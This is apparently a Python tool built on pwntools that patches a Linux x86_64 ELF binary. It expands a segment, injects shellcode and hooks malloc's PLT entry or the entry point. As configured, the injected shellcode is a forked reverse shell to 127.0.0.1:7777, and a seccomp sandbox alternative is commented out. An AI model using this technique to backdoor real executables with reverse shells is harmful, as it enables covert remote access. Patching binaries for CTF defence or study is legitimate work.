#!/usr/bin/env python
# date: 2019-03-19
# updated: 2019-12-24
# author: thinkycx

import shutil
import os
import stat
import sys
from pwn import *
from lib import util
from lib.storage import Storage
from lib.controller import Controller
import shellcode.reverseshell.forkfork_reverseshell
import shellcode.SECCOMP.seccomp

def test(filename):
    # [1] copy filename into a new file
    expanded_filename = filename + '-expanded.out'
    shutil.copyfile(filename, expanded_filename)
    os.chmod(expanded_filename, os.stat(expanded_filename).st_mode | stat.S_IXUSR)

	# expand the new file 
    storageObject = Storage(expanded_filename)
    shellcode_offset, shellcode_max_length = storageObject.expandSegment() # expandSegment() or addSegment() or eh_frameSegment()

    log.info("\t output filename: %s " % expanded_filename)

    # get shellcode
    core_shellcode = shellcode.reverseshell.forkfork_reverseshell.get_shellcode('127.0.0.1', 7777)
    # core_shellcode = shellcode.SECCOMP.seccomp.get_shellcode()

    # [2] copy filename into a new file
    filename_protected = filename + '-protected.out'
    shutil.copyfile(expanded_filename, filename_protected)
    os.chmod(filename_protected, os.stat(filename_protected).st_mode | stat.S_IXUSR)

    controllerObject = Controller(filename_protected, shellcode_offset, core_shellcode)
    # you should debug to see which func to be hooked. Notice that some programs don't have a lazy binding. 20191210
	# for heapcreator
    # controllerObject.pltHookControl(method='func_name', func_name='malloc', func_plt_number=2)
    controllerObject.pltHookControl(method='func_plt_number', func_name='malloc', func_plt_number=2)
	# for vim
    # controllerObject.entrypointHook()

    log.info("="*0x17 + 'enjoy' + "="*0x17)
    log.info("Protected file is %s" % filename_protected)    


def main():
    # show menu
    if len(sys.argv) != 2:
        util.showMenu(usage=1)
        os._exit(0)
    else:
        util.showMenu(usage=0)

    global context
    context.local(arch='amd64', os='linux')
    context.log_level = 'info'

    filename = sys.argv[1]
    log.info("filename: %s" % filename)
    if not os.path.exists(filename):
        os._exit(-1)

    elf = ELF(filename, checksec=False)
    if elf.arch != 'amd64':
        log.error("Only support linux x86_64 binary now.")
        os._exit(0)

    test(filename)

if __name__ == '__main__':
    main()